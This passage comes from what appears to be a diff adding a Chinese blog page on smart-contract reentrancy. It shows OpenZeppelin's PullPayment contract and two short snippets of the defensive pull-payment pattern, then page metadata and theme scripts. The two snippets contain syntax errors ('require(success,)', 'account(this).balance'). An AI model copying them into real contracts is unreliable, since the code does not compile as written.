class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../utils/escrow/Escrow.sol&quot;;<br><br>/**<br> * @dev Simple implementation of a<br> * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment]<br> * strategy, where the paying contract doesn&#x27;t interact directly with the<br> * receiver account, which must withdraw its payments itself.<br> *<br> * Pull-payments are often considered the best practice when it comes to sending<br> * Ether, security-wise. It prevents recipients from blocking execution, and<br> * eliminates reentrancy concerns.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> *<br> * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125;<br> * instead of Solidity&#x27;s `transfer` function. Payees can query their due<br> * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;.<br> */<br>abstract contract PullPayment &#123;<br>    Escrow private immutable _escrow;<br><br>    constructor() &#123;<br>        _escrow = new Escrow();<br>    &#125;<br><br>    /**<br>     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.<br>     *<br>     * Note that _any_ account can call this function, not just the `payee`.<br>     * This means that contracts unaware of the `PullPayment` protocol can still<br>     * receive funds this way, by having a separate account call<br>     * &#123;withdrawPayments&#125;.<br>     *<br>     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.<br>     * Make sure you trust the recipient, or are either following the<br>     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.<br>     *<br>     * @param payee Whose payments will be withdrawn.<br>     */<br>    function withdrawPayments(address payable payee) public virtual &#123;<br>        _escrow.withdraw(payee);<br>    &#125;<br><br>    /**<br>     * @dev Returns the payments owed to an address.<br>     * @param dest The creditor&#x27;s address.<br>     */<br>    function payments(address dest) public view returns (uint256) &#123;<br>        return _escrow.depositsOf(dest);<br>    &#125;<br><br>    /**<br>     * @dev Called by the payer to store the sent amount as credit to be pulled.<br>     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so<br>     * there is no danger of them being spent before withdrawal.<br>     *<br>     * @param dest The destination address of the funds.<br>     * @param amount The amount to transfer.<br>     */<br>    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;<br>        _escrow.deposit&#123;value: amount&#125;(dest);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这里，合约资金被发送给中介托管:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sendPayment(address user, address escrow) external &#123;<br>  require(msg.sender == authorized);  <br>  uint userBalance = userBalances[user];  <br>  require(userBalance &gt; 0);  <br>  userBalances[user] = 0;  <br>  (bool success,) = escrow.call&#123; value: userBalance &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这里，托管资金可以由接收者提取:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function pullPayment() external &#123;<br>  require(msg.sender == receiver);  <br>  uint payment = account(this).balance;  <br>  (bool success,) = msg.sender.call&#123; value: payment &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>智能合约重入漏洞</div>
+      <div>http://example.com/2021/11/09/智能合约重入漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 9, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/" title="智能合约错误随机性">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">智能合约错误随机性</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
